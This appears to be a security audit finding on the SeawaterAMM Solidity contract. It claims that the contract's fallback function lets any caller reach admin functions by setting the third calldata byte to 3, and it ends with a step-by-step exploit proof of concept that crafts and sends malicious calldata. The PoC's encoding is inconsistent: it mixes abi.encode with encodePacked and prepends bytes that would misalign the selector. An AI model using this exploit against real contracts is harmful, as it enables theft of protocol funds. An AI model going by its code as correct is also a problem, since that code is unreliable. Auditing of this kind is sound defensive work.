# Vulnerability details


## Summary
The `SeawaterAMM` contract's [fallback function](https://github.com/code-423n4/2024-08-superposition/blob/4528c9d2dbe1550d2660dac903a8246076044905/pkg/sol/SeawaterAMM.sol#L505-L521) lacks proper access control, allowing any caller to execute admin functions by manipulating the calldata. This  can lead to unauthorized access to privileged functions, potentially compromising the entire AMM system.

## Vulnerability Detail
The `SeawaterAMM` contract uses a proxy pattern with a fallback function to delegate calls to various executor contracts. The fallback function is implemented as follows:

```solidity

File: SeawaterAMM.sol
505:     fallback() external {
506:         require(msg.data.length > 3);
507:         require(msg.data[0] == 0);
508:         // swaps
509:         if (uint8(msg.data[2]) == 0) directDelegate(_getExecutorSwap());
510:         // update positions
511:         else if (uint8(msg.data[2]) == 1) directDelegate(_getExecutorUpdatePosition());
512:         // positions
513:         else if (uint8(msg.data[2]) == 2) directDelegate(_getExecutorPosition());
514:         // admin
515:         else if (uint8(msg.data[2]) == 3) directDelegate(_getExecutorAdmin());
516:         // swap permit 2
517:         else if (uint8(msg.data[2]) == 4) directDelegate(_getExecutorSwapPermit2());
518:         // quotes
519:         else if (uint8(msg.data[2]) == 5) directDelegate(_getExecutorQuote());
520:         else directDelegate(_getExecutorFallback());
521:     }

```

The issue arises because the fallback function does not have proper access control checks for the different types of functions it delegates to. Specifically, it allows any caller to execute admin functions by setting `msg.data[2]` to `3`.

The [`_getExecutorAdmin` function](https://github.com/code-423n4/2024-08-superposition/blob/4528c9d2dbe1550d2660dac903a8246076044905/pkg/sol/SeawaterAMM.sol#L542-L544) returns the address of the admin executor contract:

```solidity
File: SeawaterAMM.sol
542:     function _getExecutorAdmin() internal view returns (address) {
543:         return StorageSlot.getAddressSlot(EXECUTOR_ADMIN_SLOT).value;
544:     }

```

By crafting the calldata as described in the Proof of Concept below, the attacker can make the fallback function delegate the call to the admin executor contract. This means the attacker can execute any function on the admin executor contract as if they were the `SeawaterAMM` contract.

## Impact
This issue allows unauthorized access to admin functions, leading to potential creation of malicious pools, theft of protocol fees, manipulation of pool parameters, and complete compromise of the AMM system. For example, an attacker can create pools with malicious configurations, call functions that collect protocol fees and redirect them to their own address, or manipulate pool parameters to their advantage.

## Proof of Concept
To provide a detailed step-by-step example of how an attacker can craft the calldata and gain unauthorized access to admin functions, let's walk through the process. I'll use the `createPoolD650E2D0` function as the target admin function.

### Step-by-Step Example

#### 1. Understand the Target Function

The target function [`createPoolD650E2D0`](https://github.com/code-423n4/2024-08-superposition/blob/4528c9d2dbe1550d2660dac903a8246076044905/pkg/sol/SeawaterAMM.sol#L160-L168) has the following signature:

```solidity
File: SeawaterAMM.sol
160:     function createPoolD650E2D0(
161:         address /* token */,
162:         uint256 /* sqrtPriceX96 */,
163:         uint32 /* fee */,
164:         uint8 /* tickSpacing */,
165:         uint128 /* maxLiquidityPerTick */
166:     ) external {
167:         directDelegate(_getExecutorAdmin());
168:     }

```


#### 2. Calculate the Function Selector

The function selector is the first 4 bytes of the Keccak-256 hash of the function signature:

```solidity
bytes4(keccak256("createPoolD650E2D0(address,uint256,uint32,uint8,uint128)"))
```


Let's calculate it:

```solidity
bytes4 selector = bytes4(keccak256("createPoolD650E2D0(address,uint256,uint32,uint8,uint128)"));
// Result: 0xd650e2d0
```


#### 3. Encode the Function Parameters

Assume the attacker wants to create a pool with the following parameters:
- `token`: `0x1234567890abcdef1234567890abcdef12345678`
- `sqrtPriceX96`: `79228162514264337593543950336`
- `fee`: `500`
- `tickSpacing`: `10`
- `maxLiquidityPerTick`: `1000000`

Encode these parameters using ABI encoding:

```solidity
address token = 0x1234567890abcdef1234567890abcdef12345678;
uint256 sqrtPriceX96 = 79228162514264337593543950336;
uint32 fee = 500;
uint8 tickSpacing = 10;
uint128 maxLiquidityPerTick = 1000000;

bytes memory encodedParams = abi.encode(
    token,
    sqrtPriceX96,
    fee,
    tickSpacing,
    maxLiquidityPerTick
);
```


#### 4. Construct the Complete Calldata

Combine the function selector and the encoded parameters:

```solidity
bytes memory data = abi.encodePacked(
    bytes4(keccak256("createPoolD650E2D0(address,uint256,uint32,uint8,uint128)")),
    token,
    sqrtPriceX96,
    fee,
    tickSpacing,
    maxLiquidityPerTick
);
```


#### 5. Prepend the Malicious Bytes

To exploit the fallback function, prepend the necessary bytes to pass the checks:
- `msg.data[0] = 0`
- `msg.data[2] = 3`

```solidity
bytes memory maliciousData = abi.encodePacked(
    bytes1(0x00), // msg.data[0] = 0
    bytes1(0x00), // msg.data[1] = 0 (padding)
    bytes1(0x03), // msg.data[2] = 3 (targeting admin executor)
    data          // the rest of the calldata
);
```


#### 6. Send the Malicious Transaction

The attacker can send this malicious calldata using a low-level call:

```solidity
(bool success, bytes memory returnData) = address(seawaterAMM).call(maliciousData);
require(success, "Call failed");
```
